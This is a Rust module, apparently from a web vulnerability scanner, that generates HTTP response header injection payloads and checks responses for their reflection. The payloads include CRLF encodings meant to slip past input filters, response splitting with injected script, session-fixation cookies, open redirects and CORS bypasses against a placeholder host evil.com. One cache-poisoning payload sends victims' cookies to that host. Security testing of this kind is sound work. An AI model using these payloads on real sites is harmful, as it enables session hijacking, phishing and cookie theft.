use std::fmt;

use serde::{Deserialize, Serialize};

/// Technique category for HTTP response header injection and splitting attacks.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ResponseInjectionTechnique {
    CrlfInjection,
    ResponseSplitting,
    SetCookieInjection,
    LocationInjection,
    ContentTypeInjection,
    CachePoisoning,
    CorsHeaderInjection,
    XssViaResponseHeader,
    EncodingVariant,
}

impl fmt::Display for ResponseInjectionTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::CrlfInjection => "CRLF Injection",
            Self::ResponseSplitting => "HTTP Response Splitting",
            Self::SetCookieInjection => "Set-Cookie Header Injection",
            Self::LocationInjection => "Location Header Injection",
            Self::ContentTypeInjection => "Content-Type Injection",
            Self::CachePoisoning => "Cache Poisoning via Headers",
            Self::CorsHeaderInjection => "CORS Header Injection",
            Self::XssViaResponseHeader => "XSS via Response Header",
            Self::EncodingVariant => "CRLF Encoding Variant",
        };
        write!(f, "{label}")
    }
}

/// CRLF encoding representation used in injection payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CrlfEncoding {
    Literal,
    UrlEncodedLower,
    UrlEncodedUpper,
    DoubleUrlEncoded,
    UnicodeCrLf,
    Utf8OverlongCr,
    NullBytePrefixed,
}

impl CrlfEncoding {
    /// Raw byte sequence for this CRLF representation suitable for embedding in payloads.
    pub fn sequence(&self) -> &'static str {
        match self {
            Self::Literal => "\r\n",
            Self::UrlEncodedLower => "%0d%0a",
            Self::UrlEncodedUpper => "%0D%0A",
            Self::DoubleUrlEncoded => "%250d%250a",
            Self::UnicodeCrLf => "\u{000d}\u{000a}",
            Self::Utf8OverlongCr => "%c0%8d%c0%8a",
            Self::NullBytePrefixed => "%00%0d%0a",
        }
    }

    /// All supported CRLF encoding variants.
    pub fn all() -> &'static [CrlfEncoding] {
        &[
            Self::Literal,
            Self::UrlEncodedLower,
            Self::UrlEncodedUpper,
            Self::DoubleUrlEncoded,
            Self::UnicodeCrLf,
            Self::Utf8OverlongCr,
            Self::NullBytePrefixed,
        ]
    }
}

impl fmt::Display for CrlfEncoding {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Literal => "literal \\r\\n",
            Self::UrlEncodedLower => "URL-encoded lowercase %0d%0a",
            Self::UrlEncodedUpper => "URL-encoded uppercase %0D%0A",
            Self::DoubleUrlEncoded => "double URL-encoded %250d%250a",
            Self::UnicodeCrLf => "Unicode CR+LF (U+000D U+000A)",
            Self::Utf8OverlongCr => "UTF-8 overlong encoding %c0%8d%c0%8a",
            Self::NullBytePrefixed => "null-byte prefixed %00%0d%0a",
        };
        write!(f, "{label}")
    }
}

/// A detection signature describing how to verify the injection succeeded.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionSignature {
    pub method: DetectionMethod,
    pub pattern: String,
    pub description: String,
}

/// How to check whether injection was reflected in the HTTP response.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum DetectionMethod {
    ResponseHeaderPresent,
    ResponseBodyContains,
    StatusCodeChange,
    MultipleResponseBodies,
    SetCookieReflected,
    RedirectLocation,
    ContentTypeChanged,
    CorsHeaderReflected,
}

impl fmt::Display for DetectionMethod {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::ResponseHeaderPresent => "response header present",
            Self::ResponseBodyContains => "response body contains marker",
            Self::StatusCodeChange => "status code changed unexpectedly",
            Self::MultipleResponseBodies => "multiple HTTP response bodies detected",
            Self::SetCookieReflected => "Set-Cookie header reflected in response",
            Self::RedirectLocation => "Location header points to attacker URL",
            Self::ContentTypeChanged => "Content-Type changed to text/html",
            Self::CorsHeaderReflected => "Access-Control-Allow-Origin reflects attacker origin",
        };
        write!(f, "{label}")
    }
}

/// A generated response injection payload with metadata and detection info.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResponseInjectionPayload {
    pub technique: ResponseInjectionTechnique,
    pub payload: String,
    pub description: String,
    pub encoding: Option<CrlfEncoding>,
    pub detection: DetectionSignature,
}

/// Configuration for payload generation controlling which techniques and encodings to include.
#[derive(Debug, Clone)]
pub struct ResponseInjectionConfig {
    pub target_header: String,
    pub attacker_domain: String,
    pub include_encoding_variants: bool,
}

impl Default for ResponseInjectionConfig {
    fn default() -> Self {
        Self {
            target_header: "X-Injected".to_string(),
            attacker_domain: "evil.com".to_string(),
            include_encoding_variants: true,
        }
    }
}

impl ResponseInjectionConfig {
    pub fn with_target_header(mut self, header: impl Into<String>) -> Self {
        self.target_header = header.into();
        self
    }

    pub fn with_attacker_domain(mut self, domain: impl Into<String>) -> Self {
        self.attacker_domain = domain.into();
        self
    }

    pub fn with_encoding_variants(mut self, include: bool) -> Self {
        self.include_encoding_variants = include;
        self
    }
}

/// Generate all response injection payloads based on the given configuration.
pub fn generate_response_injection_payloads(
    config: &ResponseInjectionConfig,
) -> Vec<ResponseInjectionPayload> {
    let mut payloads = Vec::new();

    payloads.extend(generate_crlf_injection(config));
    payloads.extend(generate_response_splitting(config));
    payloads.extend(generate_set_cookie_injection(config));
    payloads.extend(generate_location_injection(config));
    payloads.extend(generate_content_type_injection(config));
    payloads.extend(generate_cache_poisoning(config));
    payloads.extend(generate_cors_injection(config));
    payloads.extend(generate_xss_via_header(config));

    if config.include_encoding_variants {
        payloads.extend(generate_encoding_variants(config));
    }

    payloads
}

/// Return the number of distinct injection techniques (excluding encoding variants).
pub fn technique_count() -> usize {
    8
}

/// Return the number of supported CRLF encoding variants.
pub fn encoding_variant_count() -> usize {
    CrlfEncoding::all().len()
}

fn generate_crlf_injection(config: &ResponseInjectionConfig) -> Vec<ResponseInjectionPayload> {
    let crlf = CrlfEncoding::UrlEncodedLower.sequence();
    let header = &config.target_header;

    vec![
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::CrlfInjection,
            payload: format!("value{crlf}{header}: injected-value"),
            description: format!("Inject arbitrary {header} header via CRLF in parameter value"),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::ResponseHeaderPresent,
                pattern: format!("{header}: injected-value"),
                description: format!(
                    "Check response headers for injected {header} with value 'injected-value'"
                ),
            },
        },
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::CrlfInjection,
            payload: format!("value{crlf}X-CRLF-Test: true"),
            description: "Inject canary header to confirm CRLF reflection".to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::ResponseHeaderPresent,
                pattern: "X-CRLF-Test: true".to_string(),
                description: "Check for X-CRLF-Test header in response".to_string(),
            },
        },
    ]
}

fn generate_response_splitting(config: &ResponseInjectionConfig) -> Vec<ResponseInjectionPayload> {
    let crlf = CrlfEncoding::UrlEncodedLower.sequence();
    let domain = &config.attacker_domain;

    vec![
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::ResponseSplitting,
            payload: format!(
                "value{crlf}{crlf}HTTP/1.1 200 OK{crlf}Content-Type: text/html{crlf}{crlf}\
                 <html><body><script>alert(document.domain)</script></body></html>"
            ),
            description: "Full HTTP response splitting with injected HTML body containing XSS"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::MultipleResponseBodies,
                pattern: "<script>alert(document.domain)</script>".to_string(),
                description: "Detect second HTTP response body with script tag".to_string(),
            },
        },
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::ResponseSplitting,
            payload: format!(
                "value{crlf}{crlf}HTTP/1.1 302 Found{crlf}Location: https://{domain}/phish{crlf}{crlf}"
            ),
            description: "Response splitting with injected 302 redirect to attacker domain"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::MultipleResponseBodies,
                pattern: format!("Location: https://{domain}/phish"),
                description: "Detect second HTTP response with Location redirect".to_string(),
            },
        },
    ]
}

fn generate_set_cookie_injection(
    config: &ResponseInjectionConfig,
) -> Vec<ResponseInjectionPayload> {
    let crlf = CrlfEncoding::UrlEncodedLower.sequence();
    let domain = &config.attacker_domain;

    vec![
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::SetCookieInjection,
            payload: format!(
                "value{crlf}Set-Cookie: sessionid=attacker_controlled; Path=/; HttpOnly"
            ),
            description: "Session fixation via injected Set-Cookie header with HttpOnly flag"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::SetCookieReflected,
                pattern: "Set-Cookie: sessionid=attacker_controlled".to_string(),
                description: "Check for Set-Cookie header with attacker-controlled session value"
                    .to_string(),
            },
        },
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::SetCookieInjection,
            payload: format!(
                "value{crlf}Set-Cookie: tracking=1; Domain={domain}; Path=/; SameSite=None; Secure"
            ),
            description: "Cross-domain cookie injection with SameSite=None for tracking"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::SetCookieReflected,
                pattern: format!("Set-Cookie: tracking=1; Domain={domain}"),
                description: "Check for tracking cookie scoped to attacker domain".to_string(),
            },
        },
    ]
}

fn generate_location_injection(config: &ResponseInjectionConfig) -> Vec<ResponseInjectionPayload> {
    let crlf = CrlfEncoding::UrlEncodedLower.sequence();
    let domain = &config.attacker_domain;

    vec![
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::LocationInjection,
            payload: format!("value{crlf}Location: https://{domain}/phishing"),
            description: "Open redirect via injected Location header to attacker domain"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::RedirectLocation,
                pattern: format!("Location: https://{domain}/phishing"),
                description: "Check for Location header redirecting to attacker domain".to_string(),
            },
        },
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::LocationInjection,
            payload: format!("value{crlf}Location: javascript:alert(document.domain)"),
            description: "JavaScript URI injection via Location header for XSS on redirect"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::RedirectLocation,
                pattern: "Location: javascript:".to_string(),
                description: "Check for Location header with javascript: URI scheme".to_string(),
            },
        },
    ]
}

fn generate_content_type_injection(
    _config: &ResponseInjectionConfig,
) -> Vec<ResponseInjectionPayload> {
    let crlf = CrlfEncoding::UrlEncodedLower.sequence();

    vec![
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::ContentTypeInjection,
            payload: format!(
                "value{crlf}Content-Type: text/html{crlf}{crlf}<script>alert(document.domain)</script>"
            ),
            description: "Force Content-Type to text/html enabling inline script execution"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::ContentTypeChanged,
                pattern: "Content-Type: text/html".to_string(),
                description: "Verify Content-Type changed to text/html in response".to_string(),
            },
        },
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::ContentTypeInjection,
            payload: format!(
                "value{crlf}Content-Type: application/xhtml+xml{crlf}{crlf}\
                 <html xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></html>"
            ),
            description: "Force XHTML content type for script execution in strict XML parsers"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::ContentTypeChanged,
                pattern: "Content-Type: application/xhtml+xml".to_string(),
                description: "Verify Content-Type changed to application/xhtml+xml".to_string(),
            },
        },
    ]
}

fn generate_cache_poisoning(config: &ResponseInjectionConfig) -> Vec<ResponseInjectionPayload> {
    let crlf = CrlfEncoding::UrlEncodedLower.sequence();

    vec![
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::CachePoisoning,
            payload: format!(
                "value{crlf}Cache-Control: public, max-age=31536000{crlf}\
                 X-Poisoned: true"
            ),
            description: "Inject Cache-Control with long max-age to persist poisoned response"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::ResponseHeaderPresent,
                pattern: "Cache-Control: public, max-age=31536000".to_string(),
                description: "Check for injected Cache-Control header with aggressive caching"
                    .to_string(),
            },
        },
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::CachePoisoning,
            payload: format!(
                "value{crlf}Cache-Control: public, max-age=604800{crlf}\
                 Content-Type: text/html{crlf}{crlf}\
                 <script>document.location='https://{}/steal?c='+document.cookie</script>",
                config.attacker_domain
            ),
            description:
                "Cache poisoning combined with content injection for persistent cookie theft"
                    .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::ResponseHeaderPresent,
                pattern: "Cache-Control: public, max-age=604800".to_string(),
                description: "Check for long-lived cache header combined with body injection"
                    .to_string(),
            },
        },
    ]
}

fn generate_cors_injection(config: &ResponseInjectionConfig) -> Vec<ResponseInjectionPayload> {
    let crlf = CrlfEncoding::UrlEncodedLower.sequence();
    let domain = &config.attacker_domain;

    vec![
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::CorsHeaderInjection,
            payload: format!(
                "value{crlf}Access-Control-Allow-Origin: https://{domain}{crlf}\
                 Access-Control-Allow-Credentials: true"
            ),
            description: "CORS bypass via injected Access-Control-Allow-Origin with credentials"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::CorsHeaderReflected,
                pattern: format!("Access-Control-Allow-Origin: https://{domain}"),
                description: "Check for ACAO header reflecting attacker origin with credentials"
                    .to_string(),
            },
        },
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::CorsHeaderInjection,
            payload: format!(
                "value{crlf}Access-Control-Allow-Origin: *{crlf}\
                 Access-Control-Allow-Methods: GET, POST, PUT, DELETE"
            ),
            description: "CORS wildcard injection allowing any origin to read responses"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::CorsHeaderReflected,
                pattern: "Access-Control-Allow-Origin: *".to_string(),
                description: "Check for wildcard ACAO header in response".to_string(),
            },
        },
    ]
}

fn generate_xss_via_header(config: &ResponseInjectionConfig) -> Vec<ResponseInjectionPayload> {
    let crlf = CrlfEncoding::UrlEncodedLower.sequence();

    vec![
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::XssViaResponseHeader,
            payload: format!("<script>alert(document.domain)</script>{crlf}X-Reflected: true"),
            description: "XSS via header value reflected in error page or debug output".to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::ResponseBodyContains,
                pattern: "<script>alert(document.domain)</script>".to_string(),
                description: "Check response body for reflected script tag from header value"
                    .to_string(),
            },
        },
        ResponseInjectionPayload {
            technique: ResponseInjectionTechnique::XssViaResponseHeader,
            payload: format!(
                "value{crlf}Link: <https://{}/xss.js>; rel=preload; as=script",
                config.attacker_domain
            ),
            description: "Preload XSS payload via injected Link header for resource hint attack"
                .to_string(),
            encoding: Some(CrlfEncoding::UrlEncodedLower),
            detection: DetectionSignature {
                method: DetectionMethod::ResponseHeaderPresent,
                pattern: "Link: <https://".to_string(),
                description: "Check for injected Link preload header in response".to_string(),
            },
        },
    ]
}

fn generate_encoding_variants(config: &ResponseInjectionConfig) -> Vec<ResponseInjectionPayload> {
    let header = &config.target_header;

    CrlfEncoding::all()
        .iter()
        .map(|encoding| {
            let seq = encoding.sequence();
            ResponseInjectionPayload {
                technique: ResponseInjectionTechnique::EncodingVariant,
                payload: format!("value{seq}{header}: encoding-test"),
                description: format!(
                    "CRLF injection using {encoding} encoding to bypass input filters"
                ),
                encoding: Some(*encoding),
                detection: DetectionSignature {
                    method: DetectionMethod::ResponseHeaderPresent,
                    pattern: format!("{header}: encoding-test"),
                    description: format!(
                        "Check for {header} header injected via {encoding} bypass"
                    ),
                },
            }
        })
        .collect()
}

/// Classify a raw HTTP response to detect signs of successful header injection.
pub fn detect_injection_in_response(
    response_headers: &[(String, String)],
    response_body: &str,
    expected_signatures: &[DetectionSignature],
) -> Vec<DetectionMatch> {
    let mut matches = Vec::new();

    for signature in expected_signatures {
        match signature.method {
            DetectionMethod::ResponseHeaderPresent | DetectionMethod::CorsHeaderReflected => {
                for (name, value) in response_headers {
                    let combined = format!("{name}: {value}");
                    if combined.contains(&signature.pattern) {
                        matches.push(DetectionMatch {
                            signature: signature.clone(),
                            matched_value: combined,
                        });
                    }
                }
            }
            DetectionMethod::ResponseBodyContains | DetectionMethod::MultipleResponseBodies => {
                if response_body.contains(&signature.pattern) {
                    matches.push(DetectionMatch {
                        signature: signature.clone(),
                        matched_value: signature.pattern.clone(),
                    });
                }
            }
            DetectionMethod::SetCookieReflected => {
                for (name, value) in response_headers {
                    if name.eq_ignore_ascii_case("set-cookie") {
                        let combined = format!("Set-Cookie: {value}");
                        if combined.contains(&signature.pattern) {
                            matches.push(DetectionMatch {
                                signature: signature.clone(),
                                matched_value: combined,
                            });
                        }
                    }
                }
            }
            DetectionMethod::RedirectLocation => {
                for (name, value) in response_headers {
                    if name.eq_ignore_ascii_case("location") {
                        let combined = format!("Location: {value}");
                        if combined.contains(&signature.pattern) {
                            matches.push(DetectionMatch {
                                signature: signature.clone(),
                                matched_value: combined,
                            });
                        }
                    }
                }
            }
            DetectionMethod::ContentTypeChanged => {
                for (name, value) in response_headers {
                    if name.eq_ignore_ascii_case("content-type") {
                        let combined = format!("Content-Type: {value}");
                        if combined.contains(&signature.pattern) {
                            matches.push(DetectionMatch {
                                signature: signature.clone(),
                                matched_value: combined,
                            });
                        }
                    }
                }
            }
            DetectionMethod::StatusCodeChange => {
                if response_body.contains(&signature.pattern) {
                    matches.push(DetectionMatch {
                        signature: signature.clone(),
                        matched_value: signature.pattern.clone(),
                    });
                }
            }
        }
    }

    matches
}

/// Confirmed detection of an injection based on a signature match.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionMatch {
    pub signature: DetectionSignature,
    pub matched_value: String,
}

#[cfg(test)]
#[path = "response_injection_test.rs"]
mod response_injection_test;
